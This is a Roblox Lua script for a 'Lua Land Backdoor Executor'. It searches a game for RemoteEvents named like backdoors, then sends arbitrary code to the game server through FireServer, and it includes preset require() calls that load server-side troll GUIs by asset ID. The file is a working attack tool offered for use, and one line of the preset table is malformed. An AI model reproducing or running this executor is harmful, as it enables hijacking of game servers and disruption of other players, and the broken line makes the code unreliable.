pcall(function()
	if game.CoreGui:FindFirstChild("LuaLandBackdoorExec") then
		game.CoreGui.LuaLandBackdoorExec:Destroy()
	end
end)

local TweenService = game:GetService("TweenService")
local localUser = game.Players.LocalPlayer.Name

local gui = Instance.new("ScreenGui")
gui.Name = "LuaLandBackdoorExec"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 380, 0, 340)
frame.Position = UDim2.new(0.5, -190, 0.5, -170)
frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
frame.BorderColor3 = Color3.fromRGB(0,255,0) -- green sides
frame.BorderSizePixel = 4
frame.Active = true
frame.Draggable = true

task.spawn(function()
	while frame.Parent do
		local r = math.random(0,255)
		local g = math.random(0,255)
		local b = math.random(0,255)
		TweenService:Create(frame, TweenInfo.new(0.08, Enum.EasingStyle.Linear), {
			BackgroundColor3 = Color3.fromRGB(r,g,b)
		}):Play()
		task.wait(0.08)
	end
end)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "🏝️Lua Land Backdoor Executor🏝️"
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.new(1,1,1)

local textbox = Instance.new("TextBox", frame)
textbox.Size = UDim2.new(0, 360, 0, 80)
textbox.Position = UDim2.new(0, 10, 0, 50)
textbox.ClearTextOnFocus = false
textbox.PlaceholderText = "-- Enter Require Scripts..."
textbox.TextColor3 = Color3.new(0,0,0)
textbox.Text = ""
textbox.TextWrapped = true
textbox.TextXAlignment = Enum.TextXAlignment.Left
textbox.TextYAlignment = Enum.TextYAlignment.Top
textbox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textbox.MultiLine = true

local dropLabel = Instance.new("TextLabel", frame)
dropLabel.Size = UDim2.new(0, 360, 0, 20)
dropLabel.Position = UDim2.new(0, 10, 0, 140)
dropLabel.BackgroundTransparency = 1
dropLabel.TextColor3 = Color3.new(1,1,1)
dropLabel.Text = "Backdoors found: NONE"
dropLabel.TextXAlignment = Enum.TextXAlignment.Left

local dropdown = Instance.new("TextButton", frame)
dropdown.Size = UDim2.new(0, 360, 0, 25)
dropdown.Position = UDim2.new(0, 10, 0, 165)
dropdown.Text = "Select a backdoor"
dropdown.BackgroundColor3 = Color3.fromRGB(30,30,30)
dropdown.TextColor3 = Color3.new(1,1,1)

local dropdownList = Instance.new("Frame", frame)
dropdownList.Size = UDim2.new(0, 360, 0, 0)
dropdownList.Position = UDim2.new(0, 10, 0, 190)
dropdownList.BackgroundColor3 = Color3.fromRGB(20,20,20)
dropdownList.ClipsDescendants = true

local exec = Instance.new("TextButton", frame)
exec.Size = UDim2.new(0, 175, 0, 45)
exec.Position = UDim2.new(0, 10, 0, 230)
exec.Text = "Execute"
exec.BackgroundColor3 = Color3.fromRGB(40,40,40)
exec.TextColor3 = Color3.new(1,1,1)
exec.Font = Enum.Font.GothamBold
exec.TextScaled = true

local clear = Instance.new("TextButton", frame)
clear.Size = UDim2.new(0, 175, 0, 45)
clear.Position = UDim2.new(0, 195, 0, 230)
clear.Text = "Clear"
clear.BackgroundColor3 = Color3.fromRGB(40,40,40)
clear.TextColor3 = Color3.new(1,1,1)
clear.Font = Enum.Font.GothamBold
clear.TextScaled = true

local scriptsBtn = Instance.new("TextButton", frame)
scriptsBtn.Size = UDim2.new(0, 360, 0, 30)
scriptsBtn.Position = UDim2.new(0, 10, 0, 285)
scriptsBtn.Text = "📜 Scripts"
scriptsBtn.BackgroundColor3 = Color3.fromRGB(30,30,30)
scriptsBtn.TextColor3 = Color3.new(1,1,1)

local scriptsDropdown = Instance.new("Frame", frame)
scriptsDropdown.Size = UDim2.new(0, 360, 0, 0)
scriptsDropdown.Position = UDim2.new(0, 10, 0, 315)
scriptsDropdown.BackgroundColor3 = Color3.fromRGB(20,20,20)
scriptsDropdown.ClipsDescendants = true

local dropdownOpen = false
local scriptsOpen = false
local selectedBackdoor = nil
local backdoors = {}

local function updateDropdown()
	for _, child in pairs(dropdownList:GetChildren()) do
		if child:IsA("TextButton") then
			child:Destroy()
		end
	end
	local y = 0
	for i, remote in pairs(backdoors) do
		local btn = Instance.new("TextButton", dropdownList)
		btn.Size = UDim2.new(1, 0, 0, 25)
		btn.Position = UDim2.new(0, 0, 0, y)
		btn.BackgroundColor3 = Color3.fromRGB(35,35,35)
		btn.TextColor3 = Color3.new(1,1,1)
		btn.Text = remote.Name .. " (" .. remote:GetFullName() .. ")"
		btn.TextXAlignment = Enum.TextXAlignment.Left

		btn.MouseButton1Click:Connect(function()
			selectedBackdoor = remote
			dropdown.Text = "Backdoor: " .. remote.Name
			TweenService:Create(dropdownList, TweenInfo.new(0.25), {Size = UDim2.new(0, 360, 0, 0)}):Play()
			dropdownOpen = false
		end)
		y = y + 25
	end
	TweenService:Create(dropdownList, TweenInfo.new(0.25), {Size = UDim2.new(0, 360, 0, y)}):Play()
end

for _, v in pairs(game:GetDescendants()) do
	if v:IsA("RemoteEvent") then
		local nameLower = v.Name:lower()
		if nameLower:find("server") or nameLower:find("exec") or nameLower:find("load") or nameLower:find("backdoor") then
			table.insert(backdoors, v)
		end
	end
end

if #backdoors > 0 then
	selectedBackdoor = backdoors[1]
	dropdown.Text = "Backdoor: " .. selectedBackdoor.Name
	dropLabel.Text = "Backdoors found: " .. tostring(#backdoors)
	updateDropdown()
else
	dropLabel.Text = "Backdoors found: none"
end

dropdown.MouseButton1Click:Connect(function()
	if dropdownOpen then
		TweenService:Create(dropdownList, TweenInfo.new(0.25), {Size = UDim2.new(0, 360, 0, 0)}):Play()
	else
		updateDropdown()
	end
	dropdownOpen = not dropdownOpen
end)

exec.MouseButton1Click:Connect(function()
	if selectedBackdoor then
		selectedBackdoor:FireServer(textbox.Text)
	end
end)

clear.MouseButton1Click:Connect(function()
	textbox.Text = ""
end)

local scriptNames = {
	"All Seeing Hand",
	"K00pgui V9",
	"Polaria",
	"Kidnap Gui",
  "SonicElijahMania Gui",
  "Happy Hub SS",
  "Dryq74 Gui",
  "Project Shiba",
  "Ipadkidd Gui Reborn",
  "Protokidd Gui",
  "Flying Spaceship",
	"Test Script",
}

local scriptCodes = {
	('require(5375399205).Player("%s")'):format(localUser),
	('require(17145849501).v9("%s")'):format(localUser),
	('require(123255432303221):Pload("%s")'):format(localUser),

('require(10973009971).sonic("%s")'):format(localUser),

('require(78790302691160):Hload("%s")'):format(localUser),

('require(134839673375508).Dryq74gui("%s")'):format(localUser),
 ('require(92709411293895):shiba("%s")'):format(localUser),

('require(110476458714336).ipadgui("%s")'):format(localUser),

('require(95513395921670).protokidd("%s")'):format(localUser),

('require(4922372692).load("%s")'):format(localUser),

('require(5686002742):Fire("%s")'):format(localUser),","caducus")
	('require(4901387632).clown("%s")'):format(localUser),
	"print('Test Script Running!')",
}

for i = 1, #scriptNames do
	local btn = Instance.new("TextButton", scriptsDropdown)
	btn.Size = UDim2.new(1, 0, 0, 25)
	btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
	btn.BackgroundColor3 = Color3.fromRGB(35,35,35)
	btn.TextColor3 = Color3.new(1,1,1)
	btn.Text = scriptNames[i]
	btn.MouseButton1Click:Connect(function()
		textbox.Text = scriptCodes[i]
	end)
end

scriptsBtn.MouseButton1Click:Connect(function()
	if scriptsOpen then
		TweenService:Create(scriptsDropdown, TweenInfo.new(0.25), {Size = UDim2.new(0, 360, 0, 0)}):Play()
	else
		TweenService:Create(scriptsDropdown, TweenInfo.new(0.25), {Size = UDim2.new(0, 360, 0, #scriptCodes * 25)}):Play()
	end
	scriptsOpen = not scriptsOpen
end)
